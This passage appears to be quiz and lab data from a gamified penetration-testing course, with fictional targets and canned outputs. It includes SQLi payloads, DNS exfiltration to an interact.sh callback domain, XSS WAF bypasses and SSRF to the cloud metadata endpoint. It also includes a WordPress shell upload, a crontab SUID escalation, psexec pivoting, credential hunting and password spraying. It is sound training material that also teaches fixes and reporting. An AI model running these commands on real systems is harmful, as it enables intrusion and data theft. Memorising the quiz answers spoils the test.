        {hint:"Use the stolen AWS credentials to list S3 buckets.",accept:["aws s3 ls","~aws s3","~s3 ls"],output:"2024-01-15 apex-backups\n2024-03-20 apex-customer-data\n2024-06-01 apex-internal-docs\n2024-09-10 apex-financial-records",successMsg:"4 S3 buckets accessible! Customer data and financial records.",example:"aws s3 ls",quickCmds:["aws s3 ls"]},
        {hint:"Download evidence from the customer data bucket.",accept:["aws s3 ls s3://apex-customer-data","~s3.*customer","aws s3 cp s3://apex-customer-data/export.csv ."],output:"2024-12-01 customers_full.csv (45MB)\n2024-11-15 credit_cards_encrypted.csv (12MB)\n2024-10-30 ssn_records.csv (8MB)\n\nTotal: 150,000+ customer records exposed.",successMsg:"Full customer database in S3. SQLi \u2192 SSRF \u2192 AWS \u2192 Data breach. Critical chain.",example:"aws s3 ls s3://apex-customer-data",quickCmds:["aws s3 ls s3://apex-customer-data"]}
      ]}
    ]},
    {id:"a2m",title:"\uD83C\uDFC6 Web Exploits III Mastery",isCheckpoint:true,rounds:[
      {type:"pick",q:"SSRF to cloud metadata gives you:",opts:["Temporary AWS/cloud credentials","The server's source code","Database passwords directly","SSH keys"],a:"Temporary AWS/cloud credentials",why:"Cloud metadata endpoints return IAM credentials for the server's role."},
      {type:"scenario",situation:"You found XSS + admin ticket review + no HttpOnly on session cookies.",q:"Severity when chained?",opts:["Critical \u2014 admin account takeover","Medium \u2014 just XSS","Low \u2014 needs user interaction","Informational"],a:"Critical \u2014 admin account takeover",why:"XSS alone is medium. But chained to admin session theft, it's critical."},
      {type:"pick",q:"SQLi \u2192 SSRF \u2192 AWS creds \u2192 S3 access is an example of:",opts:["Attack chaining","Social engineering","Brute forcing","Denial of service"],a:"Attack chaining",why:"Each vulnerability enables the next. Individual medium bugs become a critical chain."},
      {type:"type",q:"Access AWS metadata via SSRF:",a:["http://169.254.169.254/latest/meta-data/","curl http://169.254.169.254/latest/meta-data/"],why:"169.254.169.254 is the standard cloud metadata IP."}
    ]}
  ]},
  {id:"a3",title:"Advanced Injection",desc:"Blind, out-of-band, and filter evasion",levels:[
    {id:"a3l1",title:"Out-of-Band Techniques",rounds:[
      {type:"teach",text:"When you can't see output directly, use out-of-band (OOB). DNS exfiltration: inject a payload that makes the server resolve YOUR domain. If you see the DNS query, the injection worked. Burp Collaborator and interactsh detect these callbacks."},
      {type:"scenario",situation:"A search field is injectable but shows no output and has no time delay. Traditional boolean and time-based blind SQLi both fail.",q:"What technique to try next?",opts:["Out-of-band via DNS exfiltration","Give up, it's not injectable","Try harder with time-based","Switch to XSS"],a:"Out-of-band via DNS exfiltration",why:"OOB uses a side channel. The server makes a DNS request to your domain, confirming injection."},
      {type:"pick",q:"DNS exfiltration works by:",opts:["Making the target server resolve an attacker-controlled domain","Stealing DNS zone files","Poisoning DNS cache","Blocking DNS lookups"],a:"Making the target server resolve an attacker-controlled domain",why:"If the server queries YOUR domain, you see it in your DNS logs. Confirms code execution."}
    ]},
    {id:"a3l2",title:"WAF Bypass Lab",rounds:[
      {type:"teach",text:"Modern WAFs block basic payloads. Advanced bypasses: Unicode normalization, HTTP parameter pollution, chunked encoding, nested encoding, and using lesser-known SQL functions. Test every bypass systematically."},
      {type:"hack",story:"Apex Financial has a WAF blocking all standard SQLi and XSS. You need to get creative.",q:"Bypass the WAF with an encoded XSS payload.",a:["&lt;img src=x onerror=alert(1)&gt;","&lt;svg onload=alert(1)&gt;","&lt;details open ontoggle=alert(1)&gt;","~img.*onerror","~svg.*onload"],output:"WAF Log: Standard <script> blocked\nPayload: &lt;svg/onload=alert(1)&gt;\nResult: Alert triggered!\n\nThe WAF only filters <script> tags, not event handlers.",success:"WAF bypassed! Event handler-based XSS works when script tags are blocked.",why:"WAFs pattern-match known payloads. Alternative tags and event handlers often slip through."}
    ]},
    {id:"a3lab",title:"\uD83D\uDDA5\uFE0F Lab: Blind Extraction",rounds:[
      {type:"lab",title:"Blind Data Extraction",objective:"Extract the admin password through blind SQL injection without seeing any output.",banner:"Target: search.apex.com\nThe search is injectable but fully blind.\nNo errors, no output, no time functions.\n",steps:[
        {hint:"Set up a DNS callback listener.",accept:["interactsh-client","~interact","~collaborator","~burp.*collab"],output:"interactsh-client started\nYour domain: abc123.interact.sh\nListening for callbacks...",successMsg:"Callback listener ready. Now inject a payload that triggers DNS.",example:"interactsh-client",quickCmds:["interactsh-client"]},
        {hint:"Inject OOB payload to confirm injection.",accept:["~LOAD_FILE","~INTO OUTFILE","~dns","' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.abc123.interact.sh\\\\\\\\a'))--"],output:"DNS callback received!\nQuery: 5.7.42.abc123.interact.sh\n\nMySQL version: 5.7.42",successMsg:"OOB confirmed! The database version came through DNS.",example:"' UNION SELECT LOAD_FILE(...)",quickCmds:["inject OOB payload"]},
        {hint:"Extract the admin password character by character via DNS.",accept:["~extract","~char","~substring","~SUBSTR"],output:"Extracting admin password via DNS callbacks...\nChar 1: S (DNS: S.abc123.interact.sh)\nChar 2: u (DNS: Su.abc123.interact.sh)\n...\nFull password: Sup3r_S3cure_2024!",successMsg:"Full admin password extracted through DNS! Pure blind extraction.",example:"automated OOB extraction",quickCmds:["extract via DNS"]}
      ]}
    ]},
    {id:"a3m",title:"\uD83C\uDFC6 Injection III Mastery",isCheckpoint:true,rounds:[
      {type:"pick",q:"Out-of-band exfiltration uses:",opts:["Side channels like DNS to extract data","Direct page output","Time delays","Error messages"],a:"Side channels like DNS to extract data",why:"OOB sends data through DNS queries to an attacker-controlled domain."},
      {type:"pick",q:"If <script> is blocked by a WAF, try:",opts:["Event handlers on other tags like &lt;svg onload&gt;","Giving up on XSS","Only <script> with different case","Removing the payload"],a:"Event handlers on other tags like &lt;svg onload&gt;",why:"WAFs often only block <script>. Event handlers on img, svg, details tags bypass this."},
      {type:"scenario",situation:"No errors, no output changes, no time functions available.",q:"Which injection technique still works?",opts:["Out-of-band via DNS","Boolean-based blind","Time-based blind","Error-based"],a:"Out-of-band via DNS",why:"When all other channels are blocked, OOB uses DNS as an alternative data channel."}
    ]}
  ]}
]};

var SEC11 = {
  id:"s11",title:"Advanced Exploitation",tier:"advanced",icon:"\uD83D\uDD25",color:"var(--purple)",
  units:[
  {id:"a4",title:"Full Exploitation Chains",desc:"Initial access to domain admin",levels:[
    {id:"a4l1",title:"Initial Access Methods",rounds:[
      {type:"teach",text:"Common initial access: phishing with malicious attachments, exploiting public-facing apps (web shells, known CVEs), password spraying external services (VPN, OWA, RDP). Choose based on the attack surface."},
      {type:"scenario",situation:"Target has: Outlook Web Access (OWA), a VPN portal, a WordPress blog (v5.8), and SSH on a dev server.",q:"Best initial access vector?",opts:["Exploit known WordPress 5.8 CVEs","Phish the CEO","Brute-force SSH","DDoS the VPN"],a:"Exploit known WordPress 5.8 CVEs",why:"WordPress 5.8 has known exploits. It's the fastest path that doesn't require social engineering."},
      {type:"scenario",situation:"You've gained a low-privilege shell on the WordPress server. Apache user (www-data). The server is in the DMZ.",q:"First three things to do?",opts:["Enumerate users, check SUID, look for credentials","Immediately try kernel exploits","Delete logs to cover tracks","Scan the entire internal network loudly"],a:"Enumerate users, check SUID, look for credentials",why:"Methodical enumeration first. Kernel exploits are noisy and might crash the box."}
    ]},
    {id:"a4l2",title:"Post-Exploitation",rounds:[
      {type:"teach",text:"After shell access: stabilize your shell, enumerate everything, find credentials, establish persistence. Grab /etc/shadow, .bash_history, config files, SSH keys, browser saved passwords. Leave no stone unturned."},
      {type:"type",q:"Search for passwords in config files:",a:["grep -ri 'password' /etc/ /var/www/ /opt/","grep -ri 'pass\\|secret\\|key' /etc/ /var/www/"],why:"Config files are the #1 source of credentials on compromised systems."},
      {type:"type",q:"Check bash history for leaked commands:",a:["cat ~/.bash_history","cat /home/*/.bash_history","history"],why:"Users type passwords in commands: mysql -p'password', sshpass, curl with API keys."}
    ]},
    {id:"a4lab",title:"\uD83D\uDDA5\uFE0F Lab: Full Compromise",rounds:[
      {type:"lab",title:"Full Compromise",objective:"Go from zero access to domain admin on MegaCorp's network.",banner:"FINAL ENGAGEMENT: MegaCorp Corp\nScope: Full internal penetration test\nObjective: Domain Admin\n",steps:[
        {hint:"Exploit the WordPress vulnerability for initial access.",accept:["~exploit","~wordpress","~wpscan","msfconsole -q -x 'use exploit/unix/webapp/wp_admin_shell_upload'"],output:"[*] Uploading shell...\n[+] Shell uploaded to /wp-content/uploads/shell.php\n[*] Meterpreter session 1 opened\n\nmeterpreter > getuid\nServer username: www-data",successMsg:"Initial foothold! www-data shell on the WordPress server.",example:"msf> use exploit/unix/webapp/wp_admin_shell_upload",quickCmds:["use wp_admin_shell_upload"]},
        {hint:"Enumerate for privilege escalation vectors.",accept:["~linpeas","~enum","find / -perm -4000 2>/dev/null","./linpeas.sh"],output:"[+] Writable /etc/crontab!\n[+] MySQL running as root with empty password\n[+] Found SSH key in /var/www/.ssh/id_rsa\n[+] Kernel 4.15 (DirtyCow candidate)",successMsg:"Multiple paths to root! Writable crontab is the easiest.",example:"./linpeas.sh",quickCmds:["./linpeas.sh"]},
        {hint:"Escalate to root via the writable crontab.",accept:["~crontab","~echo.*cron","echo '* * * * * root chmod +s /bin/bash' >> /etc/crontab"],output:"Crontab modified. Waiting 60 seconds...\n$ /bin/bash -p\nbash-5.0# whoami\nroot",successMsg:"Root on the web server! Now pivot to the internal network.",example:"echo '* * * * * root chmod +s /bin/bash' >> /etc/crontab",quickCmds:["echo payload >> /etc/crontab"]},
        {hint:"Pivot to the domain controller using found credentials.",accept:["~psexec","~pivot","~domain","psexec.py admin:M3g4C0rp_2024!@10.0.0.5"],output:"Impacket psexec\nConnecting to 10.0.0.5...\nAuthentication successful!\n\nC:\\Windows\\system32> whoami\nmegacorp\\administrator\n\nDomain Admin achieved.",successMsg:"DOMAIN ADMIN! Full MegaCorp compromise. Web shell \u2192 root \u2192 pivot \u2192 DA.",example:"psexec.py admin:pass@DC",quickCmds:["psexec.py admin:pass@10.0.0.5"]}
      ]}
    ]},
    {id:"a4m",title:"\uD83C\uDFC6 Exploitation III Mastery",isCheckpoint:true,rounds:[
      {type:"pick",q:"After getting a low-privilege shell, first priority is:",opts:["Enumerate users, SUID, creds, network","Try kernel exploits immediately","Delete all logs","Scan the internet from the target"],a:"Enumerate users, SUID, creds, network",why:"Methodical enumeration finds the safest escalation path. Kernel exploits are a last resort."},
      {type:"type",q:"Search for passwords across config files:",a:["grep -ri 'password' /etc/ /var/www/ /opt/","grep -ri 'pass' /etc/ /var/www/"],why:"Config files constantly contain hardcoded credentials."},
      {type:"type",q:"Check user command history for leaked secrets:",a:["cat ~/.bash_history","cat /home/*/.bash_history"],why:"Commands often contain plaintext passwords and API keys."},
      {type:"scenario",situation:"You have root on a DMZ web server. Internal network is 10.0.0.0/24. You found domain admin creds in a config file.",q:"Final step to full compromise?",opts:["Use psexec/wmiexec to authenticate to the domain controller","Scan every port on every host","Set up a crypto miner","Email the IT team"],a:"Use psexec/wmiexec to authenticate to the domain controller",why:"With DA creds, psexec gives you a shell on the DC. Game over."}
    ]}
  ]},
  {id:"a5",title:"Reporting & Methodology",desc:"Write findings that get bugs fixed",levels:[
    {id:"a5l1",title:"Vulnerability Scoring",rounds:[
      {type:"teach",text:"CVSS scores rate severity: Critical (9-10), High (7-8.9), Medium (4-6.9), Low (0.1-3.9). Bug bounty programs pay based on severity. An SSRF reading local files might be High, but SSRF to AWS creds is Critical."},
      {type:"pick",q:"Unauthenticated RCE on a public-facing server is:",opts:["Critical (9.0+)","High (7.0)","Medium (5.0)","Low (2.0)"],a:"Critical (9.0+)",why:"Remote Code Execution with no auth = full compromise. Always critical."},
      {type:"scenario",situation:"You found SQLi that only extracts non-sensitive table names from a test database with no real data.",q:"CVSS severity?",opts:["Medium \u2014 SQLi exists but impact is limited","Critical \u2014 all SQLi is critical","Low \u2014 no real data exposed","Informational \u2014 not worth reporting"],a:"Medium \u2014 SQLi exists but impact is limited",why:"SQLi is always worth reporting, but with no sensitive data access, impact is medium not critical."}
    ]},
    {id:"a5l2",title:"Writing Reports",rounds:[
      {type:"teach",text:"Good report structure: Title, Severity, Description, Steps to Reproduce, Impact, Remediation. Be specific: 'SQLi in /api/search parameter q' not 'found SQL injection'. Include screenshots and HTTP requests. Show impact clearly."},
      {type:"order",q:"Order a vulnerability report correctly:",items:["Title & Severity","Description of the vulnerability","Steps to reproduce","Proof of concept / evidence","Business impact","Recommended fix"],why:"Clear structure helps developers understand and fix the issue quickly."},
      {type:"pick",q:"Which report title is better?",opts:["Blind SQLi in /api/v1/users?id= parameter allows full DB extraction","Found SQL injection","Security issue on the website","Bug in the search"],a:"Blind SQLi in /api/v1/users?id= parameter allows full DB extraction",why:"Specific title with location, type, and impact. Developers can find and fix it immediately."}
    ]},
    {id:"a5lab",title:"\uD83D\uDDA5\uFE0F Lab: Write a Report",rounds:[
      {type:"lab",title:"Write a Bug Report",objective:"Document the Apex Financial attack chain as a professional pentest report.",banner:"Engagement complete. Document your findings.\nYou found: SQLi, SSRF, AWS credential theft.\n",steps:[
        {hint:"What severity rating for the SQLi \u2192 SSRF \u2192 AWS chain?",accept:["critical","~critical","~9","~10"],output:"CVSS: 9.8 Critical\n\nJustification:\n- Network attack vector (no physical access needed)\n- No authentication required\n- Complete confidentiality impact (customer data)\n- Full integrity impact (can modify data)",successMsg:"Correct! This chain is Critical \u2014 unauthenticated access to all customer data.",example:"Critical (9.8)",quickCmds:["Critical"]},
        {hint:"What's the recommended fix for the SQLi?",accept:["~parameterized","~prepared","~sanitize","~input valid","parameterized queries"],output:"Remediation:\n1. Use parameterized queries (prepared statements)\n2. Implement input validation\n3. Apply least-privilege DB accounts\n4. Deploy WAF as defense-in-depth",successMsg:"Parameterized queries eliminate SQLi at the root cause.",example:"parameterized queries",quickCmds:["parameterized queries"]},
        {hint:"What's the fix for the SSRF?",accept:["~allowlist","~whitelist","~block.*internal","~validate.*url","URL allowlisting"],output:"Remediation:\n1. Allowlist permitted URL schemes and domains\n2. Block requests to internal/private IPs\n3. Disable unnecessary URL fetching\n4. Use a dedicated service for URL processing",successMsg:"URL allowlisting prevents SSRF by only permitting approved destinations.",example:"URL allowlisting",quickCmds:["URL allowlisting"]}
      ]}
    ]},
    {id:"a5m",title:"\uD83C\uDFC6 Reporting Mastery",isCheckpoint:true,rounds:[
      {type:"pick",q:"Unauthenticated RCE severity:",opts:["Critical (9.0+)","High (7.0)","Medium (5.0)","Low"],a:"Critical (9.0+)",why:"RCE with no auth is always critical."},
      {type:"order",q:"Order a bug report:",items:["Title & Severity","Steps to reproduce","Proof of concept","Impact statement","Remediation"],why:"Structured reports get bugs fixed faster."},
      {type:"pick",q:"The root fix for SQL injection is:",opts:["Parameterized queries","Input length limits","A WAF","Rate limiting"],a:"Parameterized queries",why:"Prepared statements separate code from data, eliminating injection entirely."},
      {type:"pick",q:"The root fix for SSRF is:",opts:["URL allowlisting","Blocking port 80","Adding CAPTCHA","Encrypting URLs"],a:"URL allowlisting",why:"Only permit requests to approved domains/IPs. Block all internal addresses."}
    ]}
  ]}
]};


// =============================================
// MASTERS SECTION - Final Certification
// 5 areas x 3 tests = 15 levels
// 100% required. Quizzes everything learned.
// =============================================

var SEC12 = {
  id:"s12",title:"Masters: Foundations & Terminal",tier:"masters",icon:"\uD83C\uDFC6",color:"var(--gold)",
  units:[
  {id:"m1",title:"Terminal Mastery",desc:"Everything terminal, from basics to scripts",levels:[
    {id:"m1t1",title:"\uD83E\uDD47 Terminal Test 1",isMasters:true,rounds:[
      {type:"type",q:"List all files including hidden ones:",a:["ls -la","ls -al","ls -a -l"],why:"Basic but essential. -a shows hidden files, -l shows details."},
      {type:"type",q:"Find all files named '*.conf' on the system:",a:["find / -name '*.conf'","find / -name '*.conf' 2>/dev/null","find / -type f -name '*.conf'"],why:"find with -name searches by filename pattern from root."},
      {type:"pick",q:"What does chmod 755 do?",opts:["Owner: read/write/execute. Group+Others: read/execute","Everyone gets full access","Only owner can read","No one can access the file"],a:"Owner: read/write/execute. Group+Others: read/execute",why:"7=rwx, 5=r-x. Owner full control, others can read and execute."},
      {type:"type",q:"Search all files in /var for the word 'secret':",a:["grep -ri 'secret' /var","grep -ri secret /var"],why:"-r recursive, -i case insensitive. Searches file contents."},
      {type:"build",q:"Extract usernames from /etc/passwd:",parts:["cut","-d:","-f1","/etc/passwd"],answer:["cut","-d:","-f1","/etc/passwd"],why:"Split by colon delimiter, take field 1."},
      {type:"type",q:"Show processes listening on network ports:",a:["netstat -tlnp","ss -tlnp","netstat -tulnp"],why:"Reveals services and their ports. Essential for finding attack surface."}
    ]},
    {id:"m1t2",title:"\uD83E\uDD47 Terminal Test 2",isMasters:true,rounds:[
      {type:"type",q:"Copy a file to a remote server via SSH:",a:["scp file.txt user@host:/path/","scp file.txt user@target:/tmp/"],why:"scp = secure copy over SSH."},
      {type:"pick",q:"/etc/shadow contains:",opts:["Password hashes for all users","System log files","Network configuration","Running processes"],a:"Password hashes for all users",why:"Shadow file stores hashed passwords. Only readable by root."},
      {type:"type",q:"Create a directory and all parent directories:",a:["mkdir -p /path/to/new/dir","mkdir -p path/to/dir"],why:"-p creates parent directories if they don't exist."},
      {type:"type",q:"Check the kernel version:",a:["uname -r","uname -a","cat /proc/version"],why:"Kernel version determines which exploits are available."},
      {type:"pick",q:"A SUID binary runs as:",opts:["Its owner (usually root)","The current user","Nobody","The group owner"],a:"Its owner (usually root)",why:"SUID = Set User ID. Binary runs with owner's privileges regardless of who calls it."},
      {type:"type",q:"Find all SUID binaries:",a:["find / -perm -4000 2>/dev/null","find / -perm -u=s 2>/dev/null"],why:"SUID files are privilege escalation goldmines."}
    ]},
    {id:"m1t3",title:"\uD83E\uDD47 Terminal Test 3",isMasters:true,rounds:[
      {type:"type",q:"Upgrade a dumb shell to full TTY:",a:["python3 -c 'import pty;pty.spawn(\"/bin/bash\")'","python -c 'import pty;pty.spawn(\"/bin/bash\")'"],why:"Full TTY enables interactive commands like sudo."},
      {type:"build",q:"Build an SSH tunnel to an internal server:",parts:["ssh","-L","8080:10.0.0.5:80","user@pivot"],answer:["ssh","-L","8080:10.0.0.5:80","user@pivot"],why:"Forwards local 8080 through pivot to internal server."},
      {type:"type",q:"Check crontab for scheduled jobs:",a:["cat /etc/crontab","crontab -l"],why:"Cron jobs with writable scripts = root execution."},
      {type:"pick",q:"Pass-the-Hash lets you:",opts:["Authenticate using a hash without cracking it","See all network traffic","Encrypt your connection","Crack passwords faster"],a:"Authenticate using a hash without cracking it",why:"NTLM accepts the hash directly. No plaintext password needed."},
      {type:"type",q:"Check for reusable SSH keys:",a:["ls -la ~/.ssh/","cat ~/.ssh/id_rsa"],why:"SSH keys grant access to other servers. Check known_hosts for targets."},
      {type:"type",q:"Make a script executable:",a:["chmod +x script.sh","chmod 755 script.sh"],why:"Scripts need execute permission to run."}
    ]}
  ]}
]};

var SEC13 = {
  id:"s13",title:"Masters: Networking & Scanning",tier:"masters",icon:"\uD83C\uDFC6",color:"var(--gold)",
  units:[
  {id:"m2",title:"Network Mastery",desc:"IPs, ports, protocols, and scanning",levels:[
    {id:"m2t1",title:"\uD83E\uDD47 Network Test 1",isMasters:true,rounds:[
      {type:"pick",q:"TCP port 443 runs:",opts:["HTTPS","HTTP","SSH","FTP"],a:"HTTPS",why:"443 = HTTPS (encrypted web). 80 = HTTP, 22 = SSH, 21 = FTP."},
      {type:"type",q:"Find live hosts on a network:",a:["nmap -sn 10.10.10.0/24","nmap -sn 192.168.1.0/24"],why:"-sn = ping sweep. Finds live hosts without port scanning."},
      {type:"type",q:"Run a full version detection scan:",a:["nmap -sV -sC target","nmap -A target","nmap -sV -sC 10.10.10.5"],why:"-sV detects versions, -sC runs default scripts. -A does both plus OS detection."},
      {type:"pick",q:"A SYN scan (-sS) is stealthy because:",opts:["It never completes the TCP handshake","It encrypts packets","It uses UDP instead","It's slower than normal"],a:"It never completes the TCP handshake",why:"SYN scan sends SYN, gets SYN-ACK, but sends RST instead of completing. No full connection logged."},
      {type:"type",q:"Run vulnerability scripts against a target:",a:["nmap --script vuln target","nmap --script=vuln 10.10.10.5"],why:"NSE vulnerability scripts automate checking for known CVEs."},
      {type:"build",q:"Build a stealthy scan with decoys:",parts:["nmap","-sS","-f","-D","RND:5","target"],answer:["nmap","-sS","-f","-D","RND:5","target"],why:"SYN scan + fragmentation + random decoy IPs for evasion."}
    ]},
    {id:"m2t2",title:"\uD83E\uDD47 Network Test 2",isMasters:true,rounds:[
      {type:"type",q:"Save scan results in all formats:",a:["nmap -oA results target","nmap -oA scan target"],why:"-oA creates .nmap, .xml, and .gnmap simultaneously."},
      {type:"pick",q:"Private IP range 10.0.0.0/8 is:",opts:["Internal network only, not routable on the internet","A public IP range","Reserved for DNS","Used only for VPNs"],a:"Internal network only, not routable on the internet",why:"10.x.x.x, 172.16-31.x.x, and 192.168.x.x are private/internal ranges."},
      {type:"pick",q:"What does -f do in nmap?",opts:["Fragments packets to evade firewalls","Forces scan completion","Filters results","Finds hidden ports"],a:"Fragments packets to evade firewalls",why:"Fragmentation splits packets so IDS can't easily reassemble and inspect them."},
      {type:"type",q:"Check your machine's IP address:",a:["ip addr","ifconfig","ip a","hostname -I"],why:"Know your own IP for setting up listeners and tunnels."},
      {type:"match",q:"Match the port to its service:",pairs:[["22","SSH"],["80","HTTP"],["443","HTTPS"],["3306","MySQL"]],why:"Knowing port-service mappings is fundamental to pentesting."},
      {type:"pick",q:"UDP scanning is slower because:",opts:["No acknowledgment \u2014 must wait for timeout on each port","UDP packets are larger","UDP uses encryption","UDP is more complex"],a:"No acknowledgment \u2014 must wait for timeout on each port",why:"TCP sends RST for closed ports. UDP gives no response, so nmap must wait and infer."}
    ]},
    {id:"m2t3",title:"\uD83E\uDD47 Network Test 3",isMasters:true,rounds:[
      {type:"type",q:"Enumerate subdomains and check which are live:",a:["subfinder -d target.com | httpx","subfinder -d target.com -silent | httpx"],why:"Chain subdomain discovery with live host verification."},
      {type:"type",q:"Check DNS records:",a:["dig target.com ANY","dig target.com","nslookup target.com"],why:"DNS reveals mail servers, nameservers, and IP addresses."},
      {type:"pick",q:"SSL certificate transparency logs reveal:",opts:["All subdomains a certificate was issued for","Server passwords","Database contents","Admin panel locations"],a:"All subdomains a certificate was issued for",why:"crt.sh shows every subdomain in SSL certificates. Free OSINT goldmine."},
      {type:"type",q:"Build a custom wordlist from a target site:",a:["cewl http://target.com -w custom.txt","cewl http://target.com -d 2 -w custom.txt"],why:"Custom wordlists find target-specific paths that generic lists miss."},
      {type:"type",q:"Fingerprint a website's technology:",a:["whatweb http://target.com","whatweb target.com"],why:"Reveals CMS, framework versions, server software for CVE matching."},
      {type:"pick",q:"WHOIS lookup reveals:",opts:["Domain owner, registrar, and nameservers","The server's open ports","Database schemas","Employee passwords"],a:"Domain owner, registrar, and nameservers",why:"WHOIS shows registration info including contact details and DNS servers."}
    ]}
  ]}
]};

var SEC14 = {
  id:"s14",title:"Masters: Web Attacks",tier:"masters",icon:"\uD83C\uDFC6",color:"var(--gold)",
  units:[
  {id:"m3",title:"Web Attack Mastery",desc:"SQLi, XSS, SSRF, auth bypass",levels:[
    {id:"m3t1",title:"\uD83E\uDD47 Web Attack Test 1",isMasters:true,rounds:[
      {type:"type",q:"Test for SQL injection on a login form:",a:["' OR 1=1--","admin' OR 1=1--","' OR '1'='1"],why:"If the login bypasses, the form is vulnerable to SQLi."},
      {type:"pick",q:"Blind SQLi is confirmed when:",opts:["Page behavior changes with true/false conditions","You see SQL error messages","The page crashes","Data appears in the response"],a:"Page behavior changes with true/false conditions",why:"Boolean blind: 1=1 gives one response, 1=2 gives another. Proves injection."},
      {type:"type",q:"Test for time-based blind SQLi:",a:["' AND SLEEP(5)--","' OR SLEEP(5)--"],why:"If the response delays by 5 seconds, the database executed your payload."},
      {type:"type",q:"List all database tables via UNION injection:",a:["' UNION SELECT table_name FROM information_schema.tables--","' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--"],why:"information_schema maps the entire database structure."},
      {type:"pick",q:"SEL/**/ECT bypasses WAFs because:",opts:["SQL ignores inline comments","It's a different command","Comments encrypt the query","The WAF can't read comments"],a:"SQL ignores inline comments",why:"/**/ is a SQL comment. Database reads SEL+ECT = SELECT. WAF sees gibberish."},
      {type:"pick",q:"The root fix for SQL injection is:",opts:["Parameterized queries","Input length limits","A WAF","HTTPS"],a:"Parameterized queries",why:"Prepared statements separate SQL code from user data. Injection becomes impossible."}
    ]},
    {id:"m3t2",title:"\uD83E\uDD47 Web Attack Test 2",isMasters:true,rounds:[
      {type:"pick",q:"Reflected XSS vs Stored XSS:",opts:["Reflected is in the URL, Stored is saved in the database","They're the same thing","Reflected is more dangerous","Stored only affects the attacker"],a:"Reflected is in the URL, Stored is saved in the database",why:"Stored XSS hits every user who views the page. Reflected needs a crafted link."},
      {type:"pick",q:"SSRF to cloud metadata gives you:",opts:["Temporary cloud credentials (AWS keys, etc.)","The server's source code","User passwords","SSH keys"],a:"Temporary cloud credentials (AWS keys, etc.)",why:"169.254.169.254 returns IAM credentials for the server's cloud role."},
      {type:"type",q:"Access AWS metadata via SSRF:",a:["http://169.254.169.254/latest/meta-data/","curl http://169.254.169.254/latest/meta-data/"],why:"Standard cloud metadata endpoint. Returns IAM credentials."},
      {type:"pick",q:"Command injection: user input goes directly into a shell command. How to test?",opts:["Append ; id or | whoami to the input","Try SQL injection","Send an XSS payload","Upload a PHP file"],a:"Append ; id or | whoami to the input",why:"Semicolons and pipes chain commands. ; id runs 'id' after the original command."},
      {type:"pick",q:"JWT with algorithm 'none' means:",opts:["Anyone can forge the token","Extra security is applied","The token expires faster","Encryption is enabled"],a:"Anyone can forge the token",why:"No signature verification. Attacker can change payload freely."},
      {type:"scenario",situation:"You found XSS in support tickets that admins review, plus session cookies lack HttpOnly.",q:"Attack chain?",opts:["XSS steals admin cookie \u2192 admin account takeover","Report XSS, it's just medium","Use the XSS for defacement","Chain with SQLi instead"],a:"XSS steals admin cookie \u2192 admin account takeover",why:"Stored XSS + no HttpOnly + admin views = automatic session theft. Critical chain."}
    ]},
    {id:"m3t3",title:"\uD83E\uDD47 Web Attack Test 3",isMasters:true,rounds:[
      {type:"type",q:"Scan for hidden directories:",a:["gobuster dir -u http://target.com -w common.txt","dirsearch -u http://target.com","ffuf -u http://target.com/FUZZ -w common.txt"],why:"Directory brute-forcing finds admin panels, backups, and config files."},
      {type:"pick",q:"An exposed .env file typically contains:",opts:["Database credentials and API keys","CSS stylesheets","Log files","User profiles"],a:"Database credentials and API keys",why:".env stores secrets. Exposed .env = immediate credential compromise."},
      {type:"type",q:"Brute-force virtual hosts:",a:["ffuf -u http://target -H 'Host: FUZZ.target.com' -w wordlist.txt","gobuster vhost -u http://target -w wordlist.txt"],why:"Fuzzing the Host header finds hidden subdomains/virtual hosts."},
      {type:"pick",q:"Out-of-band (OOB) exfiltration uses:",opts:["Side channels like DNS","Direct page output","Error messages","Time delays"],a:"Side channels like DNS",why:"When there's no visible output, OOB sends data through DNS queries to your domain."},
      {type:"pick",q:"The root fix for SSRF is:",opts:["URL allowlisting","Adding CAPTCHA","Encrypting URLs","Rate limiting"],a:"URL allowlisting",why:"Only permit requests to approved domains. Block all internal/private IPs."},
      {type:"match",q:"Match the vulnerability to its fix:",pairs:[["SQLi","Parameterized queries"],["XSS","Output encoding"],["SSRF","URL allowlisting"],["Command Injection","Input validation + no shell"]],why:"Each vulnerability class has a specific root-cause fix."}
    ]}
  ]}
]};

var SEC15 = {
  id:"s15",title:"Masters: Exploitation & PrivEsc",tier:"masters",icon:"\uD83C\uDFC6",color:"var(--gold)",
  units:[
  {id:"m4",title:"Exploitation Mastery",desc:"Shells, escalation, pivoting, persistence",levels:[
    {id:"m4t1",title:"\uD83E\uDD47 Exploit Test 1",isMasters:true,rounds:[
      {type:"type",q:"Start a netcat listener for a reverse shell:",a:["nc -lvnp 4444","nc -lvp 4444","ncat -lvnp 4444"],why:"Listener catches incoming reverse shell connections."},
      {type:"pick",q:"A reverse shell connects:",opts:["From the target back to your machine","From your machine to the target","Between two targets","Through a web browser"],a:"From the target back to your machine",why:"Target initiates the connection outbound to your listener. Bypasses firewalls."},
      {type:"type",q:"Crack an MD5 hash with hashcat:",a:["hashcat -m 0 hash.txt rockyou.txt","hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt"],why:"-m 0 = MD5. rockyou.txt has 14 million leaked passwords."},
      {type:"type",q:"Password spray SSH with one password across many users:",a:["hydra -L users.txt -p Welcome1 ssh://target","hydra -L users.txt -p 'Welcome1' ssh://target"],why:"-L = user list, -p = single password. Avoids account lockout."},
      {type:"pick",q:"bcrypt hashes are hard to crack because:",opts:["They're intentionally slow to compute","They use longer keys","They're encrypted twice","They change every time"],a:"They're intentionally slow to compute",why:"bcrypt uses key stretching. Each guess takes milliseconds vs nanoseconds for MD5."},
      {type:"pick",q:"Stealing a session cookie gives you:",opts:["Instant login as that user","Their plaintext password","Access to their email","Their MFA codes"],a:"Instant login as that user",why:"Session cookies ARE the authentication. No password needed."}
    ]},
    {id:"m4t2",title:"\uD83E\uDD47 Exploit Test 2",isMasters:true,rounds:[
      {type:"type",q:"Find SUID binaries for privilege escalation:",a:["find / -perm -4000 2>/dev/null","find / -perm -u=s 2>/dev/null"],why:"SUID files run as owner (root). Exploitable ones = instant root."},
      {type:"type",q:"Check for writable cron jobs:",a:["cat /etc/crontab","ls -la /etc/cron.d/","crontab -l"],why:"Writable scripts in root cron = root code execution."},
      {type:"pick",q:"A Docker container with --privileged can:",opts:["Escape to the host system","Only access its own filesystem","Run faster","Auto-update"],a:"Escape to the host system",why:"--privileged gives full host device access. Mount host disk = escape."},
